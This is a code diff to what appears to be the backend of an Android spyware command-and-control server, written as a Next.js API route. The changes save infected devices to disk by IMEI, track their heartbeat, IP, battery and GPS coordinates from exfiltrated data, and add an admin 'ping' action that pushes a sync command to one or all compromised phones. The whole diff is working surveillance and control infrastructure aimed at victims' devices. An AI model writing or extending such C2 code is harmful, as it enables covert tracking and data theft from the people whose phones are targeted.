@@ -15,6 +15,7 @@ cloudinary.config({
 
 const LOG_FILE = path.join(process.cwd(), "c2_exfiltrated_data.json");
 const ACTIVATION_CODES_FILE = path.join(process.cwd(), "c2_activation_codes.json");
+const DEVICES_FILE = path.join(process.cwd(), "c2_registered_devices.json");
 
 // In-memory C2 state
 let serverConfig = {
@@ -64,6 +65,57 @@ interface DeviceRecord {
 }
 
 let registeredDevices: Record<string, DeviceRecord> = {};
+
+// Helper: load persistent registered devices
+function loadRegisteredDevices(): Record<string, DeviceRecord> {
+  try {
+    if (fs.existsSync(DEVICES_FILE)) {
+      const data = JSON.parse(fs.readFileSync(DEVICES_FILE, "utf-8"));
+      if (data && typeof data === "object") {
+        return { ...data, ...registeredDevices };
+      }
+    }
+  } catch (e) {}
+  return registeredDevices;
+}
+
+// Helper: persist registered device to disk
+function persistRegisteredDevice(dev: DeviceRecord) {
+  registeredDevices[dev.device_id] = dev;
+  if (dev.imei) registeredDevices[dev.imei] = dev;
+  if (dev.app_service_id) registeredDevices[`DEV_${dev.app_service_id}`] = dev;
+
+  try {
+    const all = loadRegisteredDevices();
+    all[dev.device_id] = dev;
+    if (dev.imei) all[dev.imei] = dev;
+    if (dev.app_service_id) all[`DEV_${dev.app_service_id}`] = dev;
+    fs.writeFileSync(DEVICES_FILE, JSON.stringify(all, null, 2));
+  } catch (e) {}
+}
+
+// Helper: update device heartbeat
+function touchDeviceHeartbeat(identifier: string, ip?: string, extra?: Partial<DeviceRecord>) {
+  const all = loadRegisteredDevices();
+  const existing = all[identifier] || registeredDevices[identifier] || {
+    device_id: identifier,
+    model: "Android Target",
+    os: "Android",
+    last_seen: new Date().toISOString(),
+    ip: ip || "127.0.0.1",
+    network: "WiFi / 4G",
+    is_rooted: false
+  };
+
+  const updated: DeviceRecord = {
+    ...existing,
+    ...extra,
+    last_seen: new Date().toISOString(),
+    ip: ip || existing.ip || "127.0.0.1"
+  };
+
+  persistRegisteredDevice(updated);
+}
 
 export interface ActivationCodeRecord {
   code: string;       // Purely numerical (e.g. "84920153")
@@ -190,10 +242,19 @@ export async function GET(request: Request) {
     const url = new URL(request.url);
     const pathname = url.pathname.toLowerCase();
     const appServiceId = url.searchParams.get("appServiceId");
+    const clientIp = request.headers.get("x-forwarded-for") || "127.0.0.1";
 
     // 1. App polling for pending commands: `preference/pendingcommand?appServiceId=...`
     if (appServiceId || pathname.includes("pendingcommand")) {
       const sId = appServiceId || "ALL";
+
+      // Device Heartbeat: update last_seen whenever the agent polls C2
+      if (appServiceId) {
+        touchDeviceHeartbeat(`DEV_${appServiceId}`, clientIp, {
+          app_service_id: parseInt(appServiceId, 10)
+        });
+      }
+
       let commandToDeliver: string | null = null;
 
       // Check device specific queue
@@ -266,33 +327,53 @@ export async function GET(request: Request) {
     }
 
     const now = Date.now();
-    const deviceList: any[] = Object.values(registeredDevices).map(dev => ({
-      ...dev,
-      is_online: (now - new Date(dev.last_seen).getTime()) < 180000 // online if seen within 3 minutes
-    }));
+    const savedDevicesMap = loadRegisteredDevices();
+    const deviceMap = new Map<string, any>();
 
-    const seenIds = new Set(deviceList.map(d => d.device_id));
+    // 1. Populate from persistent devices (within 5 minutes = online)
+    Object.values(savedDevicesMap).forEach((dev: DeviceRecord) => {
+      const lastSeenMs = dev.last_seen ? new Date(dev.last_seen).getTime() : 0;
+      const isOnline = (now - lastSeenMs) < 300000; // 5 minutes heartbeat
+      const key = dev.imei || dev.device_id;
+      deviceMap.set(key, {
+        ...dev,
+        is_online: isOnline
+      });
+    });
+
+    // 2. Cross-reference with telemetry logs
     logs.forEach((l: any) => {
       const dId = l.device_id || l.imei || (l.appServiceId ? `DEV_${l.appServiceId}` : null);
-      if (dId && !seenIds.has(dId)) {
-        seenIds.add(dId);
-        deviceList.push({
-          device_id: dId,
-          model: l.device_model || l.serviceModel || "Android Target",
-          os: l.os_version || "Android",
-          last_seen: l.timestamp || new Date().toISOString(),
-          ip: l.registrationIP || "Mobile Sync",
-          battery: l.battery ?? null,
-          network: l.network || "WiFi / 4G",
-          is_rooted: l.is_rooted || false,
-          latitude: l.latitude || l.geoLocationLattitude,
-          longitude: l.longitude || l.geoLocationLongitude,
-          is_online: false,
-          activation_code: l.activationCode || l.activation_code || "KPTS-DEFAULT"
-        });
+      if (dId) {
+        const lastSeenMs = l.timestamp ? new Date(l.timestamp).getTime() : 0;
+        const isOnline = (now - lastSeenMs) < 300000;
+        if (!deviceMap.has(dId)) {
+          deviceMap.set(dId, {
+            device_id: dId,
+            model: l.device_model || l.serviceModel || "Android Target",
+            os: l.os_version || "Android",
+            last_seen: l.timestamp || new Date().toISOString(),
+            ip: l.registrationIP || l.ip || "Mobile Sync",
+            battery: l.battery ?? null,
+            network: l.network || "WiFi / 4G",
+            is_rooted: l.is_rooted || false,
+            latitude: l.latitude || l.geoLocationLattitude,
+            longitude: l.longitude || l.geoLocationLongitude,
+            is_online: isOnline,
+            activation_code: l.activationCode || l.activation_code || "KPTS-DEFAULT"
+          });
+        } else {
+          const existing = deviceMap.get(dId);
+          const existingLastSeenMs = new Date(existing.last_seen || 0).getTime();
+          if (lastSeenMs > existingLastSeenMs) {
+            existing.last_seen = l.timestamp;
+            existing.is_online = isOnline;
+          }
+        }
       }
     });
 
+    const deviceList: any[] = Array.from(deviceMap.values());
     const connectedCount = deviceList.filter(d => d.is_online).length;
 
     return NextResponse.json({
@@ -470,6 +551,7 @@ export async function POST(request: Request) {
         sim_id: body.simId || "SIM-01",
         imei: imei
       };
+      persistRegisteredDevice(registeredDevices[imei]);
 
       // Ensure code is in activation codes list and mark as used
       const records = saveActivationCode(activationCode, undefined);
@@ -548,35 +630,30 @@ export async function POST(request: Request) {
         }
       }
 
-      // Update registered device heartbeat
-      if (registeredDevices[deviceId]) {
-        registeredDevices[deviceId].last_seen = new Date().toISOString();
-      } else {
-        registeredDevices[deviceId] = {
-          device_id: deviceId,
-          model: "Android Target",
-          os: "Android",
-          last_seen: new Date().toISOString(),
-          ip: clientIp,
-          network: "Active",
-          is_rooted: false
-        };
-      }
-
       // Geolocation update
+      let latVal: number | undefined;
+      let lngVal: number | undefined;
       if (moduleType.includes("geo") && extractedData) {
         const lat = extractedData.latitude || extractedData.geoLocationLattitude || (Array.isArray(extractedData) && extractedData[0]?.geoLocationLattitude);
         const lng = extractedData.longitude || extractedData.geoLocationLongitude || (Array.isArray(extractedData) && extractedData[0]?.geoLocationLongitude);
         if (lat && lng) {
-          registeredDevices[deviceId].latitude = parseFloat(lat);
-          registeredDevices[deviceId].longitude = parseFloat(lng);
+          latVal = parseFloat(lat);
+          lngVal = parseFloat(lng);
         }
       }
 
-      // Battery / Status update
-      if (moduleType.includes("device") && extractedData) {
-        if (extractedData.battery !== undefined) registeredDevices[deviceId].battery = extractedData.battery;
+      // Battery update
+      let batteryVal: any = undefined;
+      if (moduleType.includes("device") && extractedData && extractedData.battery !== undefined) {
+        batteryVal = extractedData.battery;
       }
+
+      // Update registered device heartbeat & persist
+      touchDeviceHeartbeat(deviceId, clientIp, {
+        latitude: latVal,
+        longitude: lngVal,
+        battery: batteryVal
+      });
 
       await recordLog({
         type: moduleType,
@@ -675,6 +752,38 @@ export async function POST(request: Request) {
     const session = await getServerSession();
     if (!session || session.role !== "super_admin") {
       return NextResponse.json({ error: "Unauthorized: Super Admin access required" }, { status: 403 });
+    }
+
+    if (action === "ping_device" || action === "ping") {
+      const target = target_device || "ALL";
+      const pingCmd = "3-1-1"; // PREFERENCE_SYNC prompts immediate Android agent sync
+
+      if (target === "ALL") {
+        broadcastCommands.push({
+          id: "cmd_ping_" + Date.now(),
+          command: pingCmd,
+          dispatchedTo: new Set<string>(),
+          createdAt: Date.now()
+        });
+      } else {
+        if (!deviceCommandQueues[target]) deviceCommandQueues[target] = [];
+        deviceCommandQueues[target].push(pingCmd);
+      }
+
+      await recordLog({
+        type: "c2_ping",
+        target_device: target,
+        command: pingCmd,
+        timestamp: new Date().toISOString()
+      });
+
+      return NextResponse.json({
+        success: true,
+        message: `Ping dispatched to ${target}`,
+        command: pingCmd,
+        target_device: target,
+        timestamp: new Date().toISOString()
+      });
     }
 
     if (action === "generate_activation_code") {
